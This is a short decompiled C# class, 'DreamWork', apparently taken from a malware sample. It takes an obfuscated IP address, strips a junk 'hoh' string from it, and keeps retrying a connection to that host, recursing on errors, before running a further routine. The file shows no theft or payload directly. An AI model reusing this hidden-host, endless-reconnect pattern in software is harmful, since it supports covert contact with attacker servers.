using System;
using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.Srv;

namespace NoiseMe.Drags.Dots
{
	// Token: 0x02000079 RID: 121
	public class DreamWork
	{
		// Token: 0x17000102 RID: 258
		// (get) Token: 0x06000419 RID: 1049 RVA: 0x000048DC File Offset: 0x00002ADC
		private Post SM1 { get; }

		// Token: 0x17000103 RID: 259
		// (get) Token: 0x0600041A RID: 1050 RVA: 0x000048E4 File Offset: 0x00002AE4
		private Quin SM2 { get; }

		// Token: 0x0600041B RID: 1051 RVA: 0x000048EC File Offset: 0x00002AEC
		public DreamWork(string IP, string ID)
		{
			this.SM2 = new Quin();
			this.SM1 = new Post(IP.Replace("hoh", string.Empty), ID);
		}

		// Token: 0x0600041C RID: 1052 RVA: 0x0001576C File Offset: 0x0001396C
		public void Crown()
		{
			try
			{
				bool flag = false;
				if (this.SM1.Piu()())
				{
					while (!flag)
					{
						flag = this.SM1.QQu();
					}
				}
			}
			catch
			{
				this.Crown();
				return;
			}
			this.SM2.Rfs();
		}
	}
}
